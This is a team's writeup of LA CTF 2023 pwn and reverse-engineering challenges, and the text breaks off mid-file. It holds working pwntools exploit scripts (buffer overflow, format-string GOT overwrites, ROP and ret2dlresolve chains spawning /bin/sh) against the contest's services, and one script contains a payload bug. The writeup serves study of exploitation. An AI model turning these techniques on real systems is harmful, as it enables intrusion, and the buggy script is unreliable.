[{"content":"Pwn (7/9 solved) Gatekeep (529 solves) Solved by a1668k\nThis is a very easy pwn challenge. From the source code, we can see that the program generates a password with /dev/urandom. The goal of this challenge is to pass the password check in order to print the flag.\nTo solve this challenge, we need to understand one special property about strcmp(). strcmp() will compare two input strings character by character until null-character(\\0) appears. Since /dev/urandom have a chance of 1/256 that the generated number is a null byte \\x00. Therefore, we can simply keep sending requests until the password is just a null byte.\nSolve Script: from pwn import * while (true): r = remote('lac.tf', 31121) r.recvuntil(b'Password:\\n') r.sendline(b'\\x00') next = r.recvline() if (next[-4:] == b'ou!\\n'): print(r.recv()) break r.close() Flag: lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}\nbot (197 solves) Solved by a1668k\nThis challenge is a basic buffer overflow challenge. By looking at the source code, obviously, input is vulnerable to a buffer overflow attack.\nPreparation └─$ checksec bot [*] '/home/kali/Desktop/CTFs/laCTF/bot/bot' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) By checking the security of the executable, neither PIE nor Canary has been activated. By looking at the c source code, there is a line calling system(\u0026quot;cat flag.txt\u0026quot;). Therefore, we can simply overwrite the $rsp and jump to that line to run system(). But before reaching the rsp, we still need to avoid the program reaches to exit(1). Therefore, we will have to pass either if-statement.\nSolve script: from pwn import * r = remote('lac.tf', 31180) system_addr = 0x40129a payload = b'give me the flag\\x00'.ljust(0x40+0x8) + p64(system_addr) r.sendline(system_addr) r.interactive() Flag: lactf{hey_stop_bullying_my_bot_thats_not_nice}\nRickroll (90 solves) Solved by Botton\n#include \u0026lt;stdio.h\u0026gt; int main_called = 0; int main(void) { if (main_called) { puts(\u0026quot;nice try\u0026quot;); return 1; } main_called = 1; setbuf(stdout, NULL); printf(\u0026quot;Lyrics: \u0026quot;); char buf[256]; fgets(buf, 256, stdin); printf(\u0026quot;Never gonna give you up, never gonna let you down\\nNever gonna run around and \u0026quot;); printf(buf); printf(\u0026quot;Never gonna make you cry, never gonna say goodbye\\nNever gonna tell a lie and hurt you\\n\u0026quot;); return 0; } Very short source code, it obivously require the format string exploit.\nWhen printf() only have one argument, and the argument is a simple constant string with a \u0026ldquo;\\n\u0026rdquo; in the end, the compiler will convert it to be puts() instead of printf() corrected by a1668k\nSo the last printf function should be puts\nputs(\u0026#34;Never gonna make you cry, never gonna say goodbye\\nNever gonna tell a lie and hurt you\\n\u0026#34;); We can overwrite puts@got to the address of main() to keep us in a loop.\nOne thing need to take care is that we should make the main_called variable to be 0 when we back to main().\nIn first loop, we leak stack, libc address and overwrite main_called to 0 and puts@got to main().\nIn second loop, we use format string exploit to build a rop chain to get shell.\nfrom pwn import * TARGET = './rickroll' HOST = 'lac.tf' PORT = 31135 context.arch = 'amd64' # i386/amd64 context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] elf = ELF(TARGET) if len(sys.argv) \u0026gt; 1 and sys.argv[1] == 'remote': p = remote(HOST, PORT) # libc = ELF('') else: p = process(TARGET) libc = elf.libc gdbscript = ''' b *0x4011F3''' if len(sys.argv) \u0026gt; 1 and sys.argv[1] == 'gdb': gdb.attach(p, gdbscript=gdbscript) #--- helper functions s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda numb=4096 :p.recv(numb) ru = lambda delims, drop=True :p.recvuntil(delims, drop) # misc functions uu32 = lambda data :u32(data.ljust(4, b'\\x00')) uu64 = lambda data :u64(data.ljust(8, b'\\x00')) #--- leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) main = elf.symbols['main'] printf_got = elf.got['printf'] puts_got = elf.got['puts'] main_called = 0x0000000040406c payload = b'' payload += b\u0026quot;%12$hhn|\u0026quot; payload += b\u0026quot;%81c%13$hhn|||||\u0026quot; payload += b\u0026quot;%186c%14$hhn||||\u0026quot; payload += b\u0026quot;\u0026gt;\u0026gt;\u0026gt;%15$s\u0026quot; payload += p64(main_called) payload += p64(puts_got) payload += p64(puts_got+1) payload += p64(printf_got) sla(\u0026quot;Lyrics:\u0026quot;, payload) ru(b\u0026quot;\u0026gt;\u0026gt;\u0026gt;\u0026quot;) libc_base = uu64(r(6)) - 0x056cf0 #libc_base = uu64(r(6)) - 0x61c90 leak(\u0026quot;libc_base\u0026quot;, libc_base) system = libc_base + 0x048e50 #system = libc_base + 0x52290 payload = b\u0026quot;%36$hhn|\u0026quot; payload += fmtstr_payload(7, {printf_got: system}, 1) payload = payload.ljust(240, b\u0026quot;A\u0026quot;) payload += p64(main_called) sla(\u0026quot;Lyrics:\u0026quot;, payload) p.interactive() Rut-roh-relro (70 solves) Solved by Botton\nThis challenge provides a short source code\n#include \u0026lt;stdio.h\u0026gt; int main(void) { setbuf(stdout, NULL); puts(\u0026quot;What would you like to post?\u0026quot;); char buf[512]; fgets(buf, 512, stdin); printf(\u0026quot;Here's your latest post:\\n\u0026quot;); printf(buf); printf(\u0026quot;\\nWhat would you like to post?\\n\u0026quot;); fgets(buf, 512, stdin); printf(buf); printf(\u0026quot;\\nYour free trial has expired. Bye!\\n\u0026quot;); return 0; } format string attack again, but this time is Full RELRO which means we can\u0026rsquo;t ovrwrite got table.\nHowever, it give us two times to use format string attack. So again, first print to leak stack and libc addres and second print to build rop chain to get shell\nfrom pwn import * TARGET = \u0026#39;./rut_roh_relro\u0026#39; HOST = \u0026#39;lac.tf\u0026#39; PORT = 31134 context.arch = \u0026#39;amd64\u0026#39; # i386/amd64 context.log_level = \u0026#39;debug\u0026#39; context.terminal = [\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;,\u0026#39;-h\u0026#39;] elf = ELF(TARGET) if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;remote\u0026#39;: p = remote(HOST, PORT) libc = ELF(\u0026#39;libc-2.31.so\u0026#39;) else: p = process(TARGET, env={\u0026#34;LD_PRELOAD\u0026#34;: \u0026#34;./libc-2.31.so\u0026#34;}) libc = ELF(\u0026#39;libc-2.31.so\u0026#39;) gdbscript = \u0026#39;\u0026#39;\u0026#39; b *main+179\u0026#39;\u0026#39;\u0026#39; if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;gdb\u0026#39;: gdb.attach(p, gdbscript=gdbscript) #--- helper functions s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda numb=4096 :p.recv(numb) ru = lambda delims, drop=True :p.recvuntil(delims, drop) # misc functions uu32 = lambda data :u32(data.ljust(4, b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data :u64(data.ljust(8, b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{}= {:#x}\u0026#39;.format(name, addr)) #--- payload = b\u0026#34;\u0026#34; payload += b\u0026#34;\u0026gt;%71$p|%72$p\u0026#34; sla(\u0026#34;What would you like to post?\u0026#34;, payload) ru(b\u0026#34;\u0026gt;\u0026#34;) libc_base = int(r(14), 16) - 0x23d0a ru(b\u0026#34;|\u0026#34;) stack = int(r(14), 16) ret_addr = stack - 0xf0 leak(\u0026#34;libc_base\u0026#34;, libc_base) leak(\u0026#34;stack\u0026#34;, stack) system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] binsh = libc_base + next(libc.search(b\u0026#34;/bin/sh\\x00\u0026#34;)) pop_rdi = libc_base + 0x0000000000023796 payload = b\u0026#34;\u0026#34; payload += fmtstr_payload(6, {ret_addr: pop_rdi+1, ret_addr+8: pop_rdi, ret_addr+0x10: binsh, ret_addr+0x18: system}) sla(\u0026#34;What would you like to post?\u0026#34;, payload) p.interactive() Redact (46 solves) Solved by cire meat pop and Botton\nThe source code is simple (only 31 line of code), and the bug comes from:\nif (index \u0026lt; 0 || index \u0026gt; text.size() - placeholder.size()) { std::cout \u0026lt;\u0026lt; \u0026#34;Invalid index\\n\u0026#34;; return 1; } std::copy(placeholder.begin(), placeholder.end(), text.begin() + index); Since \u0026lt;string\u0026gt;.size() return size_t, index \u0026gt; text.size() - placeholder.size() must be true, thus index can be very large if placeholder.size() \u0026gt; text.size(). As a result, the std::copy can copy out-of-bound, lead to a bof.\nAs usually, crafting a rop for ret2libc is the simplest approach but cout cannot print out non-printable character while we locally testing it (although later we found a writeup doing the same thing with success). What can we do if we cannot leak libc? Partial overwrite or ret2dlresolve. Lucky PIE is disabled so that ret2dlresolve is still viable, here is the payload:\nfrom pwn import * context.binary = elf = ELF(\u0026#39;./redact\u0026#39;) p = remote(\u0026#39;lac.tf\u0026#39;,31281) basic_string = 0x4010E0 cin = 0x4041E0 cin_op = 0x401060 pop_rdi = 0x40177b pop_rsi_r15 = 0x401779 getline_plt = 0x401030 rop = ROP(elf) dlresolve = Ret2dlresolvePayload(elf, symbol=\u0026#34;system\u0026#34;, args=[\u0026#34;/bin/sh\u0026#34;]) rop.ret2dlresolve(dlresolve) text = b\u0026#39;a\u0026#39; placeholder = b\u0026#39;b\u0026#39;*72 + flat(pop_rdi, dlresolve.data_addr-0x50, basic_string) placeholder += flat(pop_rdi, cin, pop_rsi_r15, dlresolve.data_addr-0x50, 0, getline_plt) #don\u0026#39;t why this getline not working placeholder += flat(pop_rdi, cin, pop_rsi_r15, dlresolve.data_addr-0x50, 0, getline_plt) placeholder += flat(pop_rdi, cin, pop_rsi_r15, dlresolve.data_addr-0x50, 0, cin_op) placeholder += flat(pop_rdi, cin, pop_rsi_r15, dlresolve.data_addr-0x50, 0, getline_plt) #don\u0026#39;t why this getline not working placeholder += flat(pop_rdi, cin, pop_rsi_r15, dlresolve.data_addr-0x50, 0, getline_plt) placeholder += rop.chain() p.sendlineafter(b\u0026#39;: \u0026#39;,text) p.sendlineafter(b\u0026#39;: \u0026#39;,placeholder) p.sendlineafter(b\u0026#39;: \u0026#39;,b\u0026#39;0\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;*0xff) p.sendline(str(dlresolve.data_addr)) p.sendline(dlresolve.payload) p.interactive() Breakup (23 solves) Solved by Kaiziron\nSecond blood.\nThis is a simple challenge, the objective is to remove the ERC721 NFT that is owned by SomebodyYouUsedToKnow contract which has the friendName of \u0026ldquo;You\u0026rdquo;\nSetup.sol will deploy the Friend.sol and the SomebodyYouUsedToKnow contract, and SomebodyYouUsedToKnow contract will mint a friend NFT which has the name of \u0026ldquo;You\u0026rdquo;\nThere is a burn function in Friend.sol :\nfunction burn(uint256 tokenId) public { _burn(tokenId); delete friendNames[tokenId]; } It has no access control that check msg.sender is the owner of the NFT, allowing anyone to call burn() to burn anyone\u0026rsquo;s NFT and delete the friend name for the NFT\nSo just call burn(1), as the NFT owned by SomebodyYouUsedToKnow contract has the ID of 1\nFlag : lactf{s0m3_p30pl3_w4n7_t0_w4tch_th3_w0r1d_burn}\nEVMVM (7 solves) Solved by Kaiziron\nFirst blood.\nThe writeup is quite long, so I\u0026rsquo;ll just put a link here : https://github.com/Kaiziron/lactf2023-writeup/blob/main/evmvm.md\nrev (7/8 solved) string-cheese (644 solves) Solved by fsharp\nThe Linux binary checks your input against a hardcoded string. If they match, you get the flag.\nYou could run strings against the program (as hinted by the challenge name) or open it up in a reverse engineering tool like Ghidra or IDA Freeware to see what the correct input is. In this case, it\u0026rsquo;s blueberry.\nFlag: lactf{d0n7_m4k3_fun_0f_my_t4st3_1n_ch33s3}\ncaterpillar (398 solves) Solved by fsharp\nSecond blood.\nA JavaScript file is given. If the flag string variable matches all given conditions, it contains the flag.\nThe conditions are in the form of flag.charCodeAt(\u0026lt;caterpillar1\u0026gt;) == caterpillar2. caterpillar1 is the index position of a flag character, and caterpillar2 is what that character\u0026rsquo;s ASCII code should be.\nGetting the flag involves doing the following:\n Manually extract all indices and their corresponding ASCII codes. Evaluate them in a JavaScript interpreter (e.g. in your browser\u0026rsquo;s console) to turn the \u0026lsquo;caterpillars\u0026rsquo; into numbers. Sort the ASCII values by their indices in ascending order. Turn the ASCII values into their corresponding ASCII characters.  Flag: lactf{th3_hungry_l1ttl3_c4t3rp1ll4r_at3_th3_fl4g_4g41n}\nfinals-simulator (306 solves) Solved by fsharp\nSecond blood.\nYou are asked 3 math questions, where answering them all correctly gives you the flag.\nQ1: What is sin(x)/n? A: six, because the input is strcmp\u0026rsquo;d against this.\nQ2: What\u0026rsquo;s the prettiest number? A: 13371337, because the prettiest number n satisfies the condition 42 * (n + 88) = 561599850. Rearrange this equation to get n = 561599850 / 42 - 88.\nQ3: What\u0026rsquo;s the integral of 1/cabin dcabin? A: I don\u0026rsquo;t know what you\u0026rsquo;re talking about but I still know the answer, which is it's a log cabin!!!.\nFor the last question, each input character c is transformed into (17 * c) % mod, where mod = 0xfd. They are then strcmp\u0026rsquo;d against a hardcoded sequence of bytes enc, and the answer is correct if they match.\nThe correct input could be reverse engineered by solving for c for each byte in enc. Let\u0026rsquo;s say the byte is e. We get this equation:\n(17 * c) % mod = e\nSince we\u0026rsquo;re performing modular arithmetic, we could check if there is a modular multiplicative inverse for 17 with respect to the modulus. Thankfully there is one, since 17 and the modulus are coprime (i.e. gcd(17, mod) == 1).\nIn Python, the inverse could be found by computing pow(17, -1, mod), which evaluates to 134. So, now our equation becomes:\n(17 * c * 17^-1) % mod = (e * 17^-1) % mod c % mod = (e * 17^-1) % mod c % mod = (e * 134) % mod\nAssuming that the input only contains printable ASCII characters, which means c \u0026lt; mod. So: c = (e * 134) % mod\nWith this, we could get the input by running the following script:\nmod = 0xfd mult = 17 inv = pow(mult, -1, mod) # 134 enc = bytes.fromhex(\u0026#34;0ec99db82683264174e926a583940e63373737\u0026#34;) q3_ans = bytes([(e * inv) % mod for e in enc]).decode() print(q3_ans) Flag: lactf{im_n0t_qu1t3_sur3_th4ts_h0w_m4th_w0rks_bu7_0k}\nuniversal (210 solves) Solved by fsharp\nThe Java class file asks us for the flag, then checks our input against a total of 45 conditions. If all conditions are satisfied, our input is the flag.\nThe first condition simply checks if the flag is 38 characters long, but the rest are more complicated, which are in the form of ((bytes[a] ^ bytes[b] * 7 ^ ~bytes[c] + 13) \u0026amp; 0xFF) == d, and a, b, c, and d are numbers in a rather wide range.\nWe could use an SAT solver like Z3 to figure out the flag for us. It is easy to do this in Python:\n Create a variable that stores the flag. Add the complicated conditions into the solver. Check whether the conditions make it possible to solve for the flag. If yes, return the model that contains the flag and get the flag from it.  The script used is as follows:\nfrom z3 import * s = Solver() # step 1 pw_len = 38 pw = [BitVec(\u0026#34;pw%s\u0026#34; % (i), 8) for i in range(pw_len)] # step 2 s.add(((pw[34] ^ (pw[23] * 7) ^ ((~pw[36]) + 13)) \u0026amp; 0xFF) == 0xB6) s.add(((pw[37] ^ (pw[10] * 7) ^ ((~pw[21]) + 13)) \u0026amp; 0xFF) == 0xDF) s.add(((pw[24] ^ (pw[23] * 7) ^ ((~pw[19]) + 13)) \u0026amp; 0xFF) == 0xCD) # the remaining conditions are omitted for brevity # step 3 (if this prints \u0026#39;sat\u0026#39;, proceed to the next step) print(s.check()) # step 4 m = s.model() flag = \u0026#34;\u0026#34; for i in range(pw_len): flag += chr(int(str(m.evaluate(pw[i])))) print(flag) Flag: lactf{1_d0nt_see_3_b1ll10n_s0lv3s_y3t}\nctfd-plus (173 solves) Solved by fsharp\nThird blood.\nEach byte of the user input is checked against a function\u0026rsquo;s output, which takes in one byte at a time from a certain hardcoded byte sequence. The user input is the flag if they all match. However, the moment an unmatched byte is found, the program quits.\nHere, unlike finals-simulator, the byte sequence gets \u0026lsquo;decoded\u0026rsquo; into the correct input characters by the program. So, rather than writing a function that turns the byte sequence into the flag, the following could be done:\n Patch the program so that it never checks if our input is correct. This means the program would never quit if our input is incorrect. Set a breakpoint in the program right after a byte gets \u0026lsquo;decoded\u0026rsquo; so that we could get its value.  In this case, we patch the je 0x10f8 instruction at 0x110e to jmp 0x10f8, and set a breakpoint there to get the value of the al register, which contains the \u0026lsquo;decoded\u0026rsquo; byte. Finally, turn all the bytes into their corresponding ASCII characters to get the flag.\nFlag: lactf{m4yb3_th3r3_1s_s0m3_m3r1t_t0_us1ng_4_db}\nswitcheroo (96 solves) Solved by fsharp\nSecond blood.\nA static Linux binary is provided. It checks our input to see if it is 63 characters long, then does something weird to each input character to check if they satisfy a condition. If they all do, the input is the flag.\nSince this program doesn\u0026rsquo;t use any libraries like the standard C library, the pseudocode generated by reverse engineering tools like Ghidra or IDA Freeware is not quite helpful. Thankfully, it\u0026rsquo;s pretty small, so it\u0026rsquo;s possible to understand what it\u0026rsquo;s doing by reading its disassembly.\nTo explain what the program does, I\u0026rsquo;ve modified the disassembly output I got from Radare, added some comments, and put it below:\n0x401000 lea rsi, [0x402000] 0x401008 mov edi, 1 0x40100d mov edx, 0x12 0x401012 mov eax, 1 0x401017 syscall ; write(stdout, \u0026quot;Give me the flag: \u0026quot;) ; read input 0x401019 xor edi, edi 0x40101b mov rsi, rsp 0x40101e mov edx, 0x64 0x401023 xor eax, eax 0x401025 syscall ; read(stdin, flag, 100) ; check input length 0x401027 cmp rax, 0x40 ; are 64 chars read? (i.e. is the input 63 chars long?) 0x40102b jne fail ; if not, the input's wrong ; outer loop variable initialization 0x40102d xor r12, r12 ; r12 = 0 (number of wrong chars) 0x401030 lea r11, [0x40203c] ; r11 = address of bytes_arr 0x401038 xor r10, r10 ; r10 = 0 (index i) ; outer loop for checking each input char loop_cond cmp r10, rax ; are all input chars checked? 0x40103e jge check ; if yes, do the final check ; inner loop variable initialization 0x401040 movzx r9, byte [rsp + r10] ; r9 = flag[i] 0x401045 mov r8, qword [r9*8 + r11] ; r8 = bytes_arr[8 * r9 : 8 * (r9 + 1)][::-1] 0x40104d rol r8, 8 ; r8 = r8[1:] + bytes([r8[0]]) 0x401051 movzx r13, r8b ; r13 = r8[-1] (a limit) 0x401055 xor r14, r14 ; r14 = 0 (index j) ; inner loop for checking the input char with 8 particular bytes inner_loop_cond cmp r14, r13 ; is j \u0026gt;= the limit? 0x40105b jge wrong_chr ; if yes, the input char is wrong 0x40105d rol r8, 8 ; r8 = r8[1:] + bytes([r8[0]]) 0x401061 cmp r8b, r10b ; is r8[-1] == i? 0x401064 je chk_next_chr ; if yes, the input char is correct! 0x401066 inc r14 ; otherwise, j += 1 0x401069 jmp inner_loop_cond wrong_chr inc r12 ; increment the number of wrong chars chk_next_chr inc r10 ; increment the index i to check the next char 0x401071 jmp loop_cond ; check if any wrong chars are found check test r12, r12 ; are there any wrong chars? 0x401076 jne fail ; if yes, the input's wrong 0x401078 jmp success ; otherwise, it's correct! success lea rsi, [0x40202a] ; rsi = \u0026quot;That was the flag!\u0026quot; 0x401084 mov edx, 0x12 0x401089 jmp end fail lea rsi, [0x402012] ; rsi = \u0026quot;That was not the flag :(\u0026quot; 0x401093 mov edx, 0x18 0x401098 jmp end end mov edi, 1 0x40109f mov eax, 1 0x4010a4 syscall ; write(stdout, rsi) Therefore, we just need to emulate what the program does and get the flag from all valid characters found:\ndef rotate_left_1_byte(qword): return qword[1:] + bytes([qword[0]]) flag_len = 63 binary = open(\u0026#34;switcheroo\u0026#34;, \u0026#34;rb\u0026#34;).read() first_8_bytes_in_arr = bytes.fromhex(\u0026#34;0605040302010007\u0026#34;) bytes_arr_index = binary.index(first_8_bytes_in_arr) bytes_arr = binary[bytes_arr_index:] flag = \u0026#34;\u0026#34; for i in range(flag_len): for c in range(0x21, 0x7f): qword = bytes_arr[8 * c : 8 * (c + 1)][::-1] qword = rotate_left_1_byte(qword) limit = qword[-1] j = 0 isValid = True while True: if j \u0026gt;= limit: isValid = False break qword = rotate_left_1_byte(qword) if qword[-1] == i: break j += 1 if isValid: flag += chr(c) break print(flag) Flag: lactf{4223M8LY_5W17Ch_57473M3n75_4r3_7h3_4850LU73_8357_u+1f60a}\nsnek (26 solves) Solved by fsharp, harrier and RaccoonNinja; written by fsharp\nA Python script is given, which unserializes a pickled object. Running it on Python 3.10 or above starts a game of Snake where you control a snake, avoid going outside the map, and collect orbs. Each time an orb gets collected, the map changes. There are a total of 10 fixed maps, and once an orb from each map is collected, the game is over.\nI played around a bit and every time I reached the end, the snake became sad. Clearly I needed to know more about what to do to make the snake happy and get the flag.\nAt first, I was panicking because I\u0026rsquo;ve never reverse engineered a pickled object before and was unaware of tools that could be used to analyze one. My original plan was to read the CPython source code to see how a pickled object is serialized and manually reverse engineer from there onwards, without using any other tool. Thankfully, harrier pointed out that such tools already exist: He pointed me to pickletools, which could disassemble pickled objects in the command line.\nAfter sharing the disassembly of the file with my teammates, I began skimming through it. A big portion of the disassembly is structured as follows:\n 2: X BINUNICODE '0' 8: \\x94 MEMOIZE (as 0) 9: 0 POP 10: X BINUNICODE '1' 16: \\x94 MEMOIZE (as 1) 17: 0 POP \u0026lt;lots of memoizes and pops... snip...\u0026gt; 802: c GLOBAL 'builtins str.join' 821: V UNICODE '' 823: ( MARK 824: g GET 25 828: g GET 18 832: g GET 12 836: g GET 20 840: g GET 21 844: g GET 14 848: l LIST (MARK at 823) 849: \\x86 TUPLE2 850: R REDUCE 851: c GLOBAL 'builtins str.join' 870: V UNICODE '' 872: ( MARK 873: g GET 14 877: g GET 23 881: g GET 12 885: g GET 24 889: g GET 13 893: g GET 14 897: g GET 88 901: g GET 21 905: g GET 24 909: g GET 23 913: g GET 16 917: l LIST (MARK at 872) 918: \\x86 TUPLE2 919: R REDUCE 920: \\x93 STACK_GLOBAL \u0026lt;lots of mark + gets... snip...\u0026gt; Many printable characters were put into a dictionary (\u0026lsquo;memoized\u0026rsquo;), and individual characters were picked from the dictionary to create a string via __import__(\u0026quot;builtins\u0026quot;).str.join(). The string was later used to load a function from a Python module. The function gets put onto the stack used by the pickle VM.\nSeeing this, RaccoonNinja quickly whipped up a script that printed these constructed strings:\nfrom string import printable from pickletools import genops def genfromindices(l): return \u0026#34;\u0026#34;.join(printable[x] for x in l) p = b\u0026#39;...\u0026#39; mark = False i=0 for opcode, arg, pos in genops(p): if opcode.name == \u0026#39;MARK\u0026#39;: mark = [] elif opcode.name == \u0026#39;LIST\u0026#39;: print(\u0026#34;\u0026#34;.join(mark)) mark = False elif opcode.name == \u0026#39;GET\u0026#39;: mark.append(printable[arg]) With his help, a lot of precious time has been saved, and more focus could be put onto understanding the logic of the pickled file.\nI then began reverse engineering the file. Still panicking a bit, I was initially unsure whether my reverse engineering was correct. harrier was very patient with me and confirmed that my work should be correct. This gave me a lot of confidence to work through most of the rest of the file on my own.\nWith a little more help from harrier, I finally realized that the pickled file was creating a code object and executing it. After discussing with him on an approach to reverse engineering the code object, I had an idea.\nFirst, create a PYC file containing the code object. This could be done by running the following script in Python 3.10:\nimport importlib, types binbytes = b\u0026#39;d\\x00f\\x03h\\x05{\\x07t\\t`\\nf\\x0fr\\x0fz\\x10M\\x11p\\x14r\\x17t\\x1ag\\x1ax\\x1cz\\x1dL%O\u0026amp;Y\\\u0026#39;\\\u0026#39;\\\u0026#39;L*W(H)S+X1V6\\x974^7\\\\?\\x99:T=Z8\\xe3@*C M\\xe5F I.B\\xefL\u0026amp;O4[\\xf1R\u0026lt;U2\\\\\\xfbX2[8Q\\xfd^\\x08a\\x06n\\xc7d\\x0eg\\x0cg\\xc9j\\x0bg\\x13j\\x0cs\\x16|\\x13t\\xf5v\\x05\\x7f\\x1ek\\x01z\\x1a~\\xfd\\x89\\xfe\\x81\\xe3\\x85\\x05\\x86\\xf5\\x80\\xed\\x8b\\xf1\\x87\\x87\\x8f\\xf4\\x83\\xef\\x98\\xe0\\x93\\xea\\x94\\x1b\\x98\\xde\\x9b\\xc1\\xb0\\xe3\\x93\\xc4\\xb3\\xdf\\xae\\xd0\\xa3\\xda\\xa4+\\xa8\\xee\\xab\\xf1\\xb3\\xd3\\xa1\\xcc\\xbd\\xce\\xbd\\xd2\\xb7\\xca\\xb1\\xce\\xb9\\xc8\\xd8\\xc0\\xb0\\xda\\xac\\xf7\\xc1\\xbf\\xce\\xb5\\x93\\xba\\xcb\\xb4\\xc7\\xac\\xc9\\xb0\\xc8\\xb2\\xc7\\xc9\\xd1\\xa4\\xd3\\xa6\\xa5\\xaa\\xda\\xbc\\xcd\\xed\\xdb\\xa1\\xd0\\xaf\\x89\\x9c\\xec\\x86\\xf6\\xd3\\xe5\\x9b\\xea\\x99\\xbf\\x96\\xe0\\x90\\xe0\\x8a\\xf9\\xe7\\xf1\\xc5\\xf3\\x89\\xfe\\x87\\xb9\\x8c\\xfe\\x86\\xf0\\x98\\xec\\x9a\\xe8\\x8d\\x03\\x03\\x03p\\rz\\x0e\\x8b\\x08n\\ng\\t\\x9e\\x0ebLn\\x1a\\xb4\\x1c\\xb7\\x17e\\x16n\\x11`\\x12j\\x14\\xa3#Q\\xb4X*\\x86+\\x89)\\xba*^\\x1eZ$L\u0026gt;\\xb12I:J8\\\\!\\x02;A2B0$@)G6\\xed:N\\xe8D6D\\xedLOO,W6RMU+G$I\u0026gt;ZE]\u0026#34;X\\x04`{cse\\x1aw\\x0cqsk\\x10j\\nwiqes\\x12w\\x0bf\\x04h\\x1eze}\\x1a~\\xeb\\x81\\xf1W\\xf8\\x94\\xe2\\x86\\x91\\x89\\xf6\\x88\\xe7\\x88\\xfd[\\xec\\x80\\xf6\\x8b\\x8d\\x95\\xf2\\x96\\xf3\\x99\\xe9O\\xe0\\x8c\\xfa\\x87\\xb9\\xa1\\xde\\xa0\\xcf\\xa0\\xd4}\\xdc\\xae\\xce\\xb2/\\xac\\xaf\\xaf\\xd4\\xb1\\xe1\\xb3\\xc8\\xb3\\x16\\xba\\xc4\\xa8\\x1b\\xba\\xbd\\xbd\\xc2\\xae\\xbc\\xc4\\xbe\\xcb\\xdd\\xc5\\xb0\\xc7X\\xc8\\xb8\\xe5\\xb0\\xc5\\xaa\\xd7\\xe7\\xd1\\xaf\\xdb\\xa8\\xdfv\\xd9\\xa4\\xc8{\\xda\\xdd\\xdd\\xa2\\xd7\\x94\\xe9\\x9e\\xe6g\\xe4\\x8d\\xe5x\\xe8\\x98\\xc6\\x88\\xec\\x93\\xfd\\x8c\\xfb\\xb6\\xf3\\xa9\\xe3\\xaa\\xf5\\x85\\xea\\x87\\xef\\x80\\xef\\x9a\\xe5N\\x01\\x7f\\x11x\\x17z\\x04l\\x12\\x19\\x0b5\\rs\\x1dl\\x03n\\x00h\\x16\\x02\\x17d\\r\\r\\x1b+\\x1dc\\rQ\\xdb^\\\u0026#39;X7M%\\xb8(X\\x0cX*J3\\xb3033@2B8\\\\$^%\\xbf?\\x9e/\\xe1A\\xe2R\\xe5E\\xc5FII.K\\x1fM:H4N\\xd1RUU2W\\x0bY4r [\\xfeM\\xc1acc\\nA\\x1ah\\x0cI\\x01i\\xfcl\\x1c-\\x0cv\\x16kmu}w\\x04~\\x1eze}\\x18}\\xfd\\x86\\xec\\x96\\xf8\\x8a\\xe2\\xa6\\xe3\\x8b\\x1a\\x8a\\xfe\\xdc\\xf2\\x88\\xf4\\x89\\x8b\\x93\\xe8\\x92\\xf2\\x96\\x81\\x99\\x91\\x9b\\xfa\\x9f\\xe3\\x98\\xce\\xa7\\xd6\\xa4\\xc0\\x87%\\xa6\\xa9\\xa9\\xce\\xab\\xff\\xad\\xd2\\xae\\x10\\xa2\\xd6\\x90\\x15\\xb4\\xb7\\xb7\\xd6\\xb2\\xc6\\xb2\\x1c\\xa9\\xca\\xaa\\xa4\\xe5A\\xc2d\\xd4g\\xc7h\\xdfk\\xcbm\\xcc\\xcf\\xcf\\xa1\\x99\u0026#39; binbytes2 = b\u0026#39;.\\x94t\\x94?kens\\x06\\x8c\\x9a\\x99\\x99\\x99\\x99\\x99\\xb9?G\\x94(: desufnoc kens\\x10\\x8c\\x94R\\x01\\x8c\\x94L\\x01\\x8c\\x94(: das kens\\x0b\\x8c\\x94r\\x01\\x8c\\x94txt.galf\\x08\\x8c\\x94D: yppah kens\\r\\x8c\\x02K\\x059M\\x94(: daed kens\\x0c\\x8c\\x01K\\x94\\x85\\x94hsulf\\x05\\x8c\\x94\\n\\x01\\x8c\\x94.\\x01\\x8c\\x94o\\x01\\x8c\\x94#\\x01\\x8c\\x94\\x00\\x8c\\x88\\x94\\x86\\x00K\\x01K\\x94\\x86\\x00K\\x00K\\x94\\x91_h\\x94\\x86\\x06K\\x06K\\xadh\\x00\\x00\\x01!j\\x94\\x86\\x07K\\x01K\\x94\\x86\\x13K\\x08K\\x85h\\x81h\\x00\\x00\\x01jSh~h\\\u0026#39;h\\x94\\x86\\nK\\x04K\u0026#34;h\\x94\\x86\\x0fK\\x07K\\xe3h\\x94\\x86\\x03K\\x12K\\x94\\x86\\x04K\\x06K\\xdfh\\x00\\x00\\x01\\njvh\\x1ch\\x94\\x86\\x04K\\x02K\\x94\\x86\\x07K\\x00K\\x94\\x86\\x08K\\x08K\\xbeh\\xddh\\x14h\\x94\\x86\\x06K\\x05K\\x94\\x86\\x03K\\x03K\\x98h\\x94\\x86\\x0eK\\x06Kkh\\x00\\x00\\x01\\x04j\\x95h\\xd9h\\x94\\x86\\x0eK\\x0bK\\xd8h\\xd7h\\x94\\x86\\x13K\\x05K\\xd6h\\xd4h\\xf0h\\nh\\x0fh\\x06heh\\x94\\x86\\x13K\\x0cKdh\\xedh(\\x94\\x91\\x94\\x86\\x0eK\\x07K\\xd0h\\x94\\x86\\x05K\\x07K\\xceh\\x94\\x86\\x05K\\x10K\\xe8h\\\\h\\x81h\\x94\\x86\\tK\\x00K\\x94\\x86\\rK\\x11K\\xa9h}h\\x94\\x86\\x00K\\tK\\xc6hOh!h\\xe2h\\x94\\x86\\x0fK\\x10K{h\\xa5h\\xfah\\xc4h\\x94\\x86\\x00K\\x12K\\x94\\x86\\x07K\\x0fK\\x94\\x86\\nK\\rK1h\\x1dh\\x94\\x8